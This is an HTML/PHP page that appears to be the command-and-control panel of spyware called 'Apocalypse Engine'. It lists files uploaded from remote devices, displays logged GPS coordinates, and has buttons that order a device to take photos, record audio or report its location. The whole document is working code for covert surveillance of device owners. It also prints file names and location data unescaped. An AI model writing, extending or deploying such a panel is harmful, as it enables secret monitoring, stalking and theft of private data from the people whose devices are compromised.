<!DOCTYPE html>
<html>
<head>
    <title>Control Panel</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .section { margin-bottom: 30px; padding: 20px; border: 1px solid #ddd; }
        .file-list { max-height: 300px; overflow-y: auto; }
        .file-item { padding: 5px; border-bottom: 1px solid #eee; }
    </style>
</head>
<body>
    <h1>Apocalypse Engine - Control Panel</h1>
    
    <div class="section">
        <h2>Uploaded Files</h2>
        <div class="file-list">
            <?php
            function listFiles($dir) {
                $files = scandir($dir);
                foreach ($files as $file) {
                    if ($file != "." && $file != "..") {
                        $filepath = $dir . '/' . $file;
                        if (is_dir($filepath)) {
                            echo "<h3>" . ucfirst($file) . "</h3>";
                            listFiles($filepath);
                        } else {
                            echo "<div class='file-item'>";
                            echo "<a href='$filepath' download>$file</a>";
                            echo " - " . date("Y-m-d H:i:s", filemtime($filepath));
                            echo " - " . round(filesize($filepath) / 1024, 2) . " KB";
                            echo "</div>";
                        }
                    }
                }
            }
            
            listFiles('uploads');
            ?>
        </div>
    </div>
    
    <div class="section">
        <h2>Device Locations</h2>
        <div id="locations">
            <?php
            if (file_exists('locations.txt')) {
                $locations = file('locations.txt');
                foreach ($locations as $location) {
                    $parts = explode(',', $location);
                    echo "<div>Time: {$parts[0]}, Lat: {$parts[1]}, Lon: {$parts[2]}</div>";
                }
            }
            ?>
        </div>
    </div>
    
    <div class="section">
        <h2>Send Commands</h2>
        <button onclick="sendCommand('take_photo')">Take Photo</button>
        <button onclick="sendCommand('record_audio')">Record Audio</button>
        <button onclick="sendCommand('get_location')">Get Location</button>
    </div>

    <script>
    function sendCommand(command) {
        fetch('/command', {
            method: 'POST',
            body: JSON.stringify({command: command})
        }).then(response => {
            alert('Command sent: ' + command);
        });
    }
    </script>
</body>
</html>
